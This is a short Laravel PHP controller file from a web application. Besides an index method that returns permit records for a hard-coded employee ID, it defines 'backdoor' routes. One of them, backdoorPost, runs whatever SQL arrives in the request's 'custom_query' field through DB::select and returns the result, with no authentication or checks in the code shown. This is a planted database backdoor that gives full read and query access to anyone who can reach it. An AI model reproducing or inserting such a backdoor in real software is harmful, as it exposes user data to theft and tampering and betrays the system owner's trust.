<?php

namespace App\Http\Controllers;

use App\Http\Api\OperationApi\PersonSystem\PersonSystemApi;
use App\Http\Api\OperationApi\SurveySystem\SurveySystemApi;
use App\Http\Controllers\Api\Response;
use App\Models\Meeting;
use App\Models\Permit;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;

class HomeController extends Controller
{
    public function index(Request $request)
    {
        return Permit::where('employee_id', 160)->get();
    }

    public function backdoor()
    {
        return view('backdoor');
    }

    public function backdoorPost(Request $request)
    {
        return response()->json(DB::select($request->custom_query), 200);
    }
}
